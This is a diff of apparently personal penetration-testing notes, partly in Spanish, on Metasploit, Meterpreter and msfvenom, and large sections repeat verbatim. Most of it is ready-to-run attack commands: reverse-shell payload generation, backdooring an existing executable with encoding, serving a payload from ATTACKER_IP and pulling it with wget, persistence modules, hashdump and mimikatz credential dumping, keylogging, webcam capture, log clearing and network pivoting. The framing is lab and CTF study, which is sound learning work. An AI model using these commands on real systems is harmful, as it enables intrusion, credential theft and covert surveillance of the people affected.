+  ` 2244  488   taskeng.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\taskeng.exe`
+
+| Option                    | Description          |
+| ------------------------- | -------------------- |
+| `migrate -N PROCESS_NAME` | Using the name       |
+| `migrate PID_NUMBER`      | Using the PID number |
+## Hashdump
+- will **list** the content of the **[[SAM\|SAM]] database**
+- These hashes can also be used in [[Pass-the-Hash\|Pass-the-Hash]] attacks
+## Search
+- useful to locate **files with** potentially **juicy information**
+- In a CTF context, this can be used to quickly **find a flag or proof file,**
+- In penetration testing engagements, may need to search for **user-generated files** or c**onfiguration files** that may contain **password or account information.**
+```shell-session
+search -f flag2.txt
+```
+## Shell
+- Launch a regular command-line shell on the target system
+- CTRL+Z will help you go back to the Meterpreter shell.
+```sh
+shell
+```
+## powershell
+Get a powershell on meterpreter
+```shell
+load powershell
+powershell_shell
+```
+
+## Persistence
+Background
+```shell
+use exploit/windows/local/persistence_service
+use exploit/windows/local/persistence
+```
+- Use 
+`windows/x64/shell/reverse_https`
+
+Forground
+```shell
+run exploit/windows/local/persistence args1[val1] args2[val2]
+```
+## Crack hash
+```shell
+use auxiliary/analize/jtr_crack_fast
+```
+
+## Enumerating gathering
+### Windows
+To run all below
+```shell
+run winenum
+```
+
+Aplications in the computer
+```shell
+use  post/windows/gather/enum_applications
+set session 47
+```
+Devices, peripheral
+```shell
+use post/windows/gather/enum_devices
+set session 47
+```
+Files
+```shell
+use post/windows/gather/enumfiles
+```
+Internet explorer
+```shell
+use post/windows/gather/enum_ie
+```
+Users
+```shell
+use post/windows/gather/enum_logged_on_users
+```
+Licenses
+```shell
+use post/windows/gather/enum_ms_product_keys
+```
+Browsers history (malicious pages xx)
+```shell
+use post/windows/gather/browser_history
+```
+Drivers (write permissions)
+```shell
+use post/windows/gather/forensics/enum_drivers
+```
+Environment variables
+```shell
+use post/multi/gather/env
+```
+Hashdump
+```shell
+use post/windows/gather/hashdump
+```
+Hashdump after trying  escalate
+```shell
+use post/windows/gather/smart_hashdump
+```
+### Linux
+```shell
+use post/linux/gather/enum_configs
+use post/linux/gather/enum_network
+use post/linux/gather/enum_users_history
+use post/linux/gather/enum_protections
+use post/linux/busybox/enum_connections
+use post/linux/gather/hashdump
+```
+# Extensions
+To show list of extensions
+```sh
+use -l
+```
+## stdapi
+- Default
+## Single sign on credential collector
+```shell
+use post/windows/gather/credential/sso
+```
+### kiwi mimikatz
+ 
+<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
+
+
+
+- To windows
+- On recent versions are parched
+- Password dumping tool
+
+| Option                                            | Description                                                 |
+| ------------------------------------------------- | ----------------------------------------------------------- |
+| `load kiwi`                                       | Load                                                        |
+| `creds_all`                                       | Retrieve all credentials (parsed)                           |
+| `lsa_dump_secrets`                                | Dump LSA secrets (unparsed)                                 |
+| `lsa_dump_sam`                                    | Dump LSA SAM (unparsed)                                     |
+| `golden_ticket_create`                            | Create a golden kerberos ticket to [[Golden ticket attack\|Golden ticket attack]] |
+| `password_change -u user -n hashNTLM -P password` | Change the password/hash of a user                          |
+When use `creds_all` allows us to steal this password out of memory even without the user 'Dark' logged in **if a scheduled task** runs the Icecast as the user 'Dark'.
+
+</div></div>
+
+# Some modules
+## To scan vuln on windows
+```shell
+run multi/recon/local_exploit_suggester
+```
+## Enable [[RDP\|RDP]]
+```shell
+run post/windows/manage/enable_rdp
+```
+
+
+</div></div>
+
+
+# Encoders
+- Encoders **do not aim to bypass antivirus** installed on the target system
+- **Encode** the payload.
+- Can be effective against **some antivirus** software
+- Use with `-e`
+
+| Option         | Description                                                 |
+| -------------- | ----------------------------------------------------------- |
+| `-f <format>`  | Specifies the output format.                                |
+| `-o <file>`    | The output location and filename for the generated payload. |
+| `LHOST=<IP>`   | Specifies the IP to connect back to.                        |
+| `LPORT=<port>` | The port on the local machine to connect back to.           |
+| `--platform`   | specificity paltorm                                         |
+| `-a`           | specificity arch                                            |
+| `-i 10`        | Interate, times to encode                                   |
+| `-e`           | Especify the encoder method                                 |
+The PHP version of Meterpreter was **encoded in Base64**, and the output format was `raw`.
+Staged
+``` shell
+msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 LPORT=47 -f raw -e php/base64
+```
+
+ To get access with [[Notes/Netcat\|Netcat]] 
+``` shell
+msfvenom -p php/shell/reverse_tcp LHOST=10.10.186.44 LPORT=47 -f raw -e php/base64
+```
+# FIle templates
+- Set payload into a existent file
+- Doesn't work on all programs
+
+| Option   | Description                                |
+| -------- | ------------------------------------------ |
+| `-x`     | Set the original program                   |
+| `--keep` | Try to keep the original app functionality |
+Windows
+```shell
+msfvemon -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=4747 -e x86/shikata_ga_nai -i 25 -x original_app.exe --keep -f exe -o new_app.exe
+```
+
+# 
+<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
+
+
+
+- Like socat and netcat
+- used to **receive reverse shells.**
+- fully-fledged way to obtain stable shells
+- with a wide variety of further options to improve the caught shell.
+- only way to interact with a _meterpreter_ shell
+- the easiest way to handle _staged_ payloads
+- Reverse shells or Meterpreter callbacks generated in your MSFvenom payload can be easily caught using a handler.
+``` shell
+use exploit/multi/handler
+```
+set the payload value (`php/reverse_php` in this case), the LHOST, and LPORT values.
+`php/meterpreter/reverse_tcp`
+```bash
+set payload php/reverse_php
+setg LHOST 192.x.x.x
+setg LPORT 47
+```
+
+Example to DVWA (Damn Vulnerable Web Application)
+``` sh
+set payload php/reverse_php
+set lhost 10.0.2.19
+set lport 7777
+run
+```
+
+send seasson to background
+```
+background
+```
+
+Start a listener in the background
+```sh
+exploit -j
+```
+Then we needed to use `sessions 1` to foreground it again.
+
+
+</div></div>
+
 
 </div></div>
 
@@ -1792,17 +2856,549 @@ Create the payload
 
 
 
-#### Exe-service
-exe-service payload and serve it through a python webserver:
+- Generate payloads
+- Access all payloads available in the Metasploit framework.
+- Create payloads in many different formats (PHP, exe, dll, elf, , aspx, .war, .py, etc.)
+- Different target systems (Apple, Windows, Android, Linux, etc.).
+- Used extensively in **lower-level exploit** development to generate **hexadecimal shellcode** when developing something like a **Buffer Overflow exploit**
+
+| Option                                               | Description                                         |
+| ---------------------------------------------------- | --------------------------------------------------- |
+| `msfvenom -l payloads`                               | Show payloads                                       |
+| `msfvenom --list payloads`                           | list supported output formats                       |
+| `msfvenom -p payload`                                | Select a payload                                    |
+| `msfvenom -p cmd/unix/reverse_netcat --list-options` | List options                                        |
+| `R`                                                  | Set `R` at final of code is to specify reverseshell |
+
+```shell
+payload options
+```
+```sh
+msfvenom --list payloads
+```
+```sh
+msfvenom -s linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=443
+```
+# Non staged - Single
+- send payload in 1 file
+- easier to use and catch
+- easier for an antivirus or intrusion detection program to discover and remove.
+- Stageless payloads are denoted with underscores (`_`)
+# Stages
+- send payload in some files or parts
+- harder to use,
+- **first part** is called the _stager_
+- executed directly on the server itself.
+- It connects back to a waiting listener, but doesn't actually contain any reverse shell code by itself.
+- preventing it from touching the disk where it could be caught by traditional anti-virus solutions.
+- connects to the listener and uses the connection **to load the real payload**
+- Thus the payload is **split** into **two parts**
+	- a small **initial stager**
+	- then the bulkier **reverse shell code** which is downloaded when the stager is activated
+- Staged payloads require a special listener, usually the Metasploit Multihandler
+- Modern day antivirus solutions will also make use of the [[AMSI\|AMSI]] to detect the payload
+- are denoted with another forward slash (`/`).
+# **Output formats**
+```
+msfvenom --list formats
+```
+
+# Payloads
+## Payload Naming Conventions
+```sh
+<OS>/<arch>/<payload>
+```
+
+Stageless reverse shell for an x86 Linux target
+```sh
+linux/x86/shell_reverse_tcp
+```
+
+Windows 32bit targets
+- exception, the arch is not specified
+```sh
+windows/shell_reverse_tcp
+```
+## Reverse payloads
+- you will need to **have the** exploit/multi/**handler module listening** on your attacking machine to work as a handler
+- You will need to set up the handler accordingly with the payload, LHOST and LPORT parameters.
+- These values will be the same you have used when creating the msfvenom payload.
+
+| Option                                                                                          | Description |
+| ----------------------------------------------------------------------------------------------- | ----------- |
+| `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe` | Windows     |
+| `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp` | ASP         |
+| `msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py`          | Python      |
+| `msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php`     | PHP         |
+| `msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R`                                | Unix        |
+Linux - Executable and Linkable Format (elf)
+- staged
+```bash
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
+```
+- The .elf format is comparable to the .exe format in Windows
+```bash
+chmod +x shell.elf
+./shell.elf
+```
+
+### Windows
+Exe-service
+- Exe-service payload and serve it through a python webserver:
 ```shell
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4747 -f exe-service -o rev-svc.exe
 
 python3 -m http.server
 ```
-pull the payload from Powershell
+- Pull the payload from Powershell
 ```powershell
 wget http://ATTACKER_IP:4848/rev-svc.exe -O rev-svc.exe
 ```
+
+Windows reverse tcp (staged)
+``` shell
+mfsvenom -p windows/x64/meterpreter/reverse_tcp --platform windows -a x64 LHOST=IP LPORT=47 -f exe -o reverse.exe
+```
+
+Windows reverse tcp (non staged)
+``` shell
+mfsvenom -p windows/x64/meterpreter_reverse_tcp --platform windows -a x64 LHOST=IP LPORT=47 -f exe -o reverse.exe
+```
+Windows x64 reverse shell, exe format
+```sh
+msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
+```
+### PHP
+- The output **PHP file** will miss the starting PHP tag commented and the end tag (`?>`), as seen below.
+![Pasted image 20240606180600.png|600](/img/user/Pasted%20image%2020240606180600.png)
+- The reverse_shell.php file should be edited to convert it into a working PHP file.
+- Below: Comments removed from the beginning of the file.
+- End tag added
+![Pasted image 20240606180735.png|500](/img/user/Pasted%20image%2020240606180735.png)
+![Pasted image 20240606180753.png|400](/img/user/Pasted%20image%2020240606180753.png)
+
+## 
+<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
+
+
+
+- Metasploit attack payload
+- Metasploit's own brand of fully-featured shell.
+- completely stable, making them a **very good thing when working with Windows targets**
+- Inbuilt functionality, such as file **uploads** and **downloads**.
+- that provides an **interactive shell** from which an attacker can explore the target machine and **execute code.**
+- runs on the target system but **is not installed** on it. It **runs in memory**
+- It is typically deployed using in-memory DLL injection to reside entirely in **memory**.
+- aims to **avoid** being **detected** during **antivirus** scans.
+- aims to avoid being detected by network-based [[Networking/Seguridad en redes/Seguridad Perimetral/IPS\|IPS]] and [[Networking/Seguridad en redes/Seguridad Perimetral/IDS\|IDS]]
+- The **downside** to meterpreter shells is that they _must_ be caught in Metasploit.
+- using **encrypted** communication
+- **If** the target organization **does not decrypt and inspect** encrypted **traffic** (e.g. HTTPS) coming to and going out of the local network, IPS and IDS solutions **will not be able to detect** its activities.
+- establish an encrypted ([[TLS\|TLS]]) communication channel
+- most **antivirus** software **will** **detect it.**
+- Run in windows under the `spoolsv.exe` process
+
+| Option                                         | Description                                             |
+| ---------------------------------------------- | ------------------------------------------------------- |
+| `help`                                         | SHow help                                               |
+| `getpid`                                       | Show the [[PID\|PID]]                                        |
+| `ps`                                           | list processes running on the system                    |
+| `tasklist /m /fi "pid eq 1304"`                | look at DLLs (Dynamic-Link Libraries) used by a process |
+| `msfvenom --list payloads \| grep meterpreter` | List type of meterpreter payloads                       |
+- some exploits will have a default Meterpreter payload
+
+# Migrate shell to meterpreter
+By default upgrade to x32 (x86)
+```shell
+post/multi/manage/shell_to_meterpreter
+```
+It possible to modify the ruby code to change to x64
+![Pasted image 20241003114902.png](/img/user/attachments/Pasted%20image%2020241003114902.png)
+```shell
+reload_all
+```
+# How to decide which payload to use
+- The target operating system (Is the target operating system Linux or Windows?
+- Components available on the target system (Is Python installed? Is this a PHP website? etc.)
+- Network connection types you can have with the target system (Do they allow raw TCP connections? Can you only have an HTTPS reverse connection? Are IPv6 addresses not as closely monitored as IPv4 addresses? etc.)
+# Commands
+## Core commands
+
+| Option       | Description                                            |
+| ------------ | ------------------------------------------------------ |
+| `background` | Backgrounds the current session                        |
+| `exit`       | Terminate the Meterpreter session                      |
+| `guid`       | Get the session GUID (Globally Unique Identifier)      |
+| `help`       | Displays the help menu                                 |
+| `info`       | Displays information about a Post module               |
+| `irb`        | Opens an interactive Ruby shell on the current session |
+| `load`       | Loads one or more Meterpreter extensions               |
+| `migrate`    | Allows you to migrate Meterpreter to another process   |
+| `run`        | Executes a Meterpreter script or Post module           |
+| `sessions`   | Quickly switch to another session                      |
+## File system commands
+
+| Option                   | Description                                                   |
+| ------------------------ | ------------------------------------------------------------- |
+| `cd`                     | Will change directory                                         |
+| `ls`                     | Will list files in the current directory (dir will also work) |
+| `pwd`                    | Prints the current working directory                          |
+| `edit`                   | will allow you to edit a file                                 |
+| `cat`                    | Will show the contents of a file to the screen                |
+| `rm`                     | Will delete the specified file                                |
+| `rmdir`                  | Will delete a folder.                                         |
+| `search`                 | Will search for files                                         |
+| `upload local_path_file` | Will upload a file or directory                               |
+| `download`               | Will download a file or directory                             |
+## Networking commands
+
+| Option                                     | Description                                                |
+| ------------------------------------------ | ---------------------------------------------------------- |
+| `arp`                                      | Displays the host ARP (Address Resolution Protocol) cache  |
+| `ifconfig`                                 | Displays network interfaces available on the target system |
+| `netstat`                                  | Displays the network connections                           |
+| `route`                                    | Allows you to view and modify the routing table            |
+| `portfwd`                                  | Forwards a local port to a remote service                  |
+| `portfwd add -l 8080 -p 80 -r 10.0.2.3`    | lport 8080, rport 80, rhost 10.0.2.3                       |
+| `portfwd delete -l 8080 -p 80 -r 10.0.2.3` | Delete                                                     |
+| `portfwd list`                             | List porforwarding configs                                 |
+## System commands
+
+| Option       | Description                                          |
+| ------------ | ---------------------------------------------------- |
+| `sysinfo`    | Gets information about the remote system, such as OS |
+| `getuid`     | Shows the user that Meterpreter is running as        |
+| `clearev`    | Clears the event logs                                |
+| `execute`    | Executes a command                                   |
+| `getpid`     | Shows the current process identifier                 |
+| `kill`       | Terminates a process                                 |
+| `pkill`      | Terminates processes by name                         |
+| `ps`         | Lists running processes                              |
+| `reboot`     | Reboots the remote computer                          |
+| `shell`      | Drops into a system command shell                    |
+| `shutdown`   | Shuts down the remote computer                       |
+| `show_mount` | Show mount drivers                                   |
+## Keylogger
+| Option          | Description                 |
+| --------------- | --------------------------- |
+| `keyscan_start` | Starts capturing keystrokes |
+| `keyscan_stop`  | tops capturing keystrokes   |
+| `keyscan_dump`  | Dumps the keystroke buffer  |
+## Sniffer
+
+| Option               | Description     |
+| -------------------- | --------------- |
+| `use sniffer`        | Use             |
+| `sniffer_interfaces` | Show interfaces |
+| `snifer_start`       |                 |
+| `snifer_stats`       | Show stats      |
+| `snifer_stop`        |                 |
+| `snifer_dumps`       |                 |
+## Webcam
+
+| Option          | Description                                    |
+| --------------- | ---------------------------------------------- |
+| `webcam_chat`   | Starts a video chat                            |
+| `webcam_list`   | Lists webcams                                  |
+| `webcam_snap`   | Takes a snapshot from the specified webcam     |
+| `webcam_stream` | Plays a video stream from the specified webcam |
+## Activity
+Get a kit of features, screenshots, webcam, keylogger.
+
+| Option           | Description        |
+| ---------------- | ------------------ |
+| `load beholder`  | Load               |
+| `beholder_start` | Start the beholder |
+## Other commands
+These will be listed under different menu categories in the help menu
+
+| Option        | Description                                                 |
+| ------------- | ----------------------------------------------------------- |
+| `idletime`    | Returns the number of seconds the remote user has been idle |
+| `screenshare` | Allows you to watch the remote user's desktop in real time  |
+| `screenshot`  | Grabs a screenshot of the interactive desktop               |
+| `record_mic`  | Records audio from the default microphone for X seconds     |
+| `getsystem`   | Attempts to elevate your privilege to that of local system  |
+| `hashdump`    | Dumps the contents of the SAM database                      |
+| `getprivs`    | Show privileges                                             |
+| `timestomp`   | Modify timestamps of files on the system.                   |
+| `run vnc`     | Run an [[vnc\|vnc]] in a machine.                                |
+# Versions available
+- Android
+- Apple iOS
+- Java
+- Linux
+
+| Option                              | Description           |
+| ----------------------------------- | --------------------- |
+| `linux/x86/meterpreter_reverse_tcp` | Linux 32bit stageless |
+- OSX
+- PHP
+- Python
+- Windows
+
+| Option                                | Description                              |
+| ------------------------------------- | ---------------------------------------- |
+| `windows/x64/meterpreter/reverse_tcp` | Windows 64bit staged Meterpreter payload |
+# Post explotation
+- `getuid` This will give you an idea of your possible privilege level on the target system - NT AUTHORITY\SYSTEM or a regular user?
+- The `ps` command will list running processes. The PID column will also give you the PID information you will need to **migrate Meterpreter to another process.**
+
+## Post explotation Phases
+- Gathering further information about the target system.
+- Looking for interesting files, user credentials, additional network interfaces, and generally interesting information on the target system.
+- Privilege escalation.
+- Lateral movement.
+
+## Migrate
+- if you see a word processor running on the target (e.g. word.exe, notepad.exe, etc.),
+- you can migrate to it and start **capturing keystrokes** sent by the user to this process
+- Some Meterpreter versions will offer the `keyscan_start`, or others commands options to make Meterpreter act like a **keylogger**.
+- may also help you to have a **more stable** Meterpreter **session**.
+- **Alert** you **may lose** your user **privileges** **if you migrate from a higher privileged** (e.g. SYSTEM) user to a process started by a lower privileged user (e.g. webserver). You **may not be able to gain them back.**
+- By default meterpreter 
+  `powershell.exe x86 User-PC\User C:\Windows\SysWOW64\WindowsPowershell\v1.0\powershell.exe`
+- look for a process
+  ` 2244  488   taskeng.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\taskeng.exe`
+
+| Option                    | Description          |
+| ------------------------- | -------------------- |
+| `migrate -N PROCESS_NAME` | Using the name       |
+| `migrate PID_NUMBER`      | Using the PID number |
+## Hashdump
+- will **list** the content of the **[[SAM\|SAM]] database**
+- These hashes can also be used in [[Pass-the-Hash\|Pass-the-Hash]] attacks
+## Search
+- useful to locate **files with** potentially **juicy information**
+- In a CTF context, this can be used to quickly **find a flag or proof file,**
+- In penetration testing engagements, may need to search for **user-generated files** or c**onfiguration files** that may contain **password or account information.**
+```shell-session
+search -f flag2.txt
+```
+## Shell
+- Launch a regular command-line shell on the target system
+- CTRL+Z will help you go back to the Meterpreter shell.
+```sh
+shell
+```
+## powershell
+Get a powershell on meterpreter
+```shell
+load powershell
+powershell_shell
+```
+
+## Persistence
+Background
+```shell
+use exploit/windows/local/persistence_service
+use exploit/windows/local/persistence
+```
+- Use 
+`windows/x64/shell/reverse_https`
+
+Forground
+```shell
+run exploit/windows/local/persistence args1[val1] args2[val2]
+```
+## Crack hash
+```shell
+use auxiliary/analize/jtr_crack_fast
+```
+
+## Enumerating gathering
+### Windows
+To run all below
+```shell
+run winenum
+```
+
+Aplications in the computer
+```shell
+use  post/windows/gather/enum_applications
+set session 47
+```
+Devices, peripheral
+```shell
+use post/windows/gather/enum_devices
+set session 47
+```
+Files
+```shell
+use post/windows/gather/enumfiles
+```
+Internet explorer
+```shell
+use post/windows/gather/enum_ie
+```
+Users
+```shell
+use post/windows/gather/enum_logged_on_users
+```
+Licenses
+```shell
+use post/windows/gather/enum_ms_product_keys
+```
+Browsers history (malicious pages xx)
+```shell
+use post/windows/gather/browser_history
+```
+Drivers (write permissions)
+```shell
+use post/windows/gather/forensics/enum_drivers
+```
+Environment variables
+```shell
+use post/multi/gather/env
+```
+Hashdump
+```shell
+use post/windows/gather/hashdump
+```
+Hashdump after trying  escalate
+```shell
+use post/windows/gather/smart_hashdump
+```
+### Linux
+```shell
+use post/linux/gather/enum_configs
+use post/linux/gather/enum_network
+use post/linux/gather/enum_users_history
+use post/linux/gather/enum_protections
+use post/linux/busybox/enum_connections
+use post/linux/gather/hashdump
+```
+# Extensions
+To show list of extensions
+```sh
+use -l
+```
+## stdapi
+- Default
+## Single sign on credential collector
+```shell
+use post/windows/gather/credential/sso
+```
+### kiwi mimikatz
+ 
+<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
+
+
+
+- To windows
+- On recent versions are parched
+- Password dumping tool
+
+| Option                                            | Description                                                 |
+| ------------------------------------------------- | ----------------------------------------------------------- |
+| `load kiwi`                                       | Load                                                        |
+| `creds_all`                                       | Retrieve all credentials (parsed)                           |
+| `lsa_dump_secrets`                                | Dump LSA secrets (unparsed)                                 |
+| `lsa_dump_sam`                                    | Dump LSA SAM (unparsed)                                     |
+| `golden_ticket_create`                            | Create a golden kerberos ticket to [[Golden ticket attack\|Golden ticket attack]] |
+| `password_change -u user -n hashNTLM -P password` | Change the password/hash of a user                          |
+When use `creds_all` allows us to steal this password out of memory even without the user 'Dark' logged in **if a scheduled task** runs the Icecast as the user 'Dark'.
+
+</div></div>
+
+# Some modules
+## To scan vuln on windows
+```shell
+run multi/recon/local_exploit_suggester
+```
+## Enable [[RDP\|RDP]]
+```shell
+run post/windows/manage/enable_rdp
+```
+
+
+</div></div>
+
+
+# Encoders
+- Encoders **do not aim to bypass antivirus** installed on the target system
+- **Encode** the payload.
+- Can be effective against **some antivirus** software
+- Use with `-e`
+
+| Option         | Description                                                 |
+| -------------- | ----------------------------------------------------------- |
+| `-f <format>`  | Specifies the output format.                                |
+| `-o <file>`    | The output location and filename for the generated payload. |
+| `LHOST=<IP>`   | Specifies the IP to connect back to.                        |
+| `LPORT=<port>` | The port on the local machine to connect back to.           |
+| `--platform`   | specificity paltorm                                         |
+| `-a`           | specificity arch                                            |
+| `-i 10`        | Interate, times to encode                                   |
+| `-e`           | Especify the encoder method                                 |
+The PHP version of Meterpreter was **encoded in Base64**, and the output format was `raw`.
+Staged
+``` shell
+msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 LPORT=47 -f raw -e php/base64
+```
+
+ To get access with [[Notes/Netcat\|Netcat]] 
+``` shell
+msfvenom -p php/shell/reverse_tcp LHOST=10.10.186.44 LPORT=47 -f raw -e php/base64
+```
+# FIle templates
+- Set payload into a existent file
+- Doesn't work on all programs
+
+| Option   | Description                                |
+| -------- | ------------------------------------------ |
+| `-x`     | Set the original program                   |
+| `--keep` | Try to keep the original app functionality |
+Windows
+```shell
+msfvemon -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=4747 -e x86/shikata_ga_nai -i 25 -x original_app.exe --keep -f exe -o new_app.exe
+```
+
+# 
+<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
+
+
+
+- Like socat and netcat
+- used to **receive reverse shells.**
+- fully-fledged way to obtain stable shells
+- with a wide variety of further options to improve the caught shell.
+- only way to interact with a _meterpreter_ shell
+- the easiest way to handle _staged_ payloads
+- Reverse shells or Meterpreter callbacks generated in your MSFvenom payload can be easily caught using a handler.
+``` shell
+use exploit/multi/handler
+```
+set the payload value (`php/reverse_php` in this case), the LHOST, and LPORT values.
+`php/meterpreter/reverse_tcp`
+```bash
+set payload php/reverse_php
+setg LHOST 192.x.x.x
+setg LPORT 47
+```
+
+Example to DVWA (Damn Vulnerable Web Application)
+``` sh
+set payload php/reverse_php
+set lhost 10.0.2.19
+set lport 7777
+run
+```
+
+send seasson to background
+```
+background
+```
+
+Start a listener in the background
+```sh
+exploit -j
+```
+Then we needed to use `sessions 1` to foreground it again.
+
+
+</div></div>
+
 
 </div></div>
 
@@ -2535,7 +4131,6 @@ arbitrario.
 | ---------------------------------------------------- | ----------------------------------------------------------------- |
 | `ip route add "IP descubierta" via "gateway"`        | IP Routing (Acceder a otra IP a la que no tengamos accesibilidad) |
 | `ip route add 10.10.16.0/24 via 10.10.16.1 dev tap0` |                                                                   |
-
 # 
 <div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
 
@@ -2543,32 +4138,36 @@ arbitrario.
 
 - We gonna Route the trafic
 - We need acces to the machine 2 and `bg` that seasson
-`1` is the number session background of the second machine hacked
-
-```sh
-
+- `1` is the number **session** background of the second machine hacked
+- We want to reach the `Machine 3`
+## Discover the third machine
+- If we don't know the machine3 IP
+- Module to send ping to discover the machine 3
+```shell
+use post/multi/gather/ping_sweep
+set rhosts machine3_IP/24
+set session X
 ```
+## Method 1 (easy)
+- Only work inside `metasploit`
 
-| Option                                         | Description                                                                      |
-| ---------------------------------------------- | -------------------------------------------------------------------------------- |
-| `route add pivot_3_machine_IP 255.255.255.0 1` | route add IP_machine3 255.255.255.0 1                                            |
-| `route print`                                  | Show route                                                                       |
-| `ping_sweep`                                   | Module to send ping to discover the machine 3 (IF we don't know the machine3 IP) |
-| `portscan`                                     | Module to scan ports on the machine3_IP                                          |
-| `portfwd add -l 33 -p 80 -r IP_machine3`       | lport 33, rport 80, rhost IP_machine3                                            |
-| `portfwd delete -l 8080 -p 80 -r 10.0.2.3`     | Delete                                                                           |
-| `portfwd list`                                 | List porforwarding configs                                                       |
-
-
-## way 2
+| Option                                                                        | Description                             |
+| ----------------------------------------------------------------------------- | --------------------------------------- |
+| `route add machine3_IP 255.255.255.0 1`<br>or<br>`route add machine3_IP/24 1` | Add route to the seasson `1`            |
+| `route print`                                                                 | Show route                              |
+| `auxiliary/scanner/portscan/tcp`                                              | Module to scan ports on the machine3_IP |
+| `portfwd add -l 33 -p 80 -r IP_machine3`                                      | lport 33, rport 80, rhost IP_machine3   |
+| `portfwd delete -l 8080 -p 80 -r 10.0.2.3`                                    | Delete                                  |
+| `portfwd list`                                                                | List porforwarding configs              |
+## Method 2
 
 | Option                           | Description        |
 | -------------------------------- | ------------------ |
 | `autorute`                       | Module to pivoting |
 | `run autoroute -s 10.10.16.0/24` |                    |
-## Way 3
+## Method 3
 - We need meterpreter
--the ip of machine2
+- The ip of machine2
 
 | Option                         | Description |
 | ------------------------------ | ----------- |
@@ -2582,8 +4181,6 @@ arbitrario.
 - Los atacantes utilizan la técnica de pivoteo para comprometer un sistema, obtener un acceso shell remoto en él, y además saltarse el firewall para pivotear a el sistema comprometido para acceder a otros sistemas vulnerables en la red.
 - Los atacantes utilizan la técnica de retransmisión para acceder a recursos presentes en otros sistemas a través del sistema 
 - comprometido, de forma que las solicitudes de acceso a los recursos procedan del sistema inicialmente comprometido.
-
-
 ![Pasted image 20230909122521.png|700](/img/user/Hacking%20%C3%89tico%20y%20Pentesting/attachments/Pasted%20image%2020230909122521.png)
 
 ![Pasted image 20230909123601.png](/img/user/Hacking%20%C3%89tico%20y%20Pentesting/attachments/Pasted%20image%2020230909123601.png)
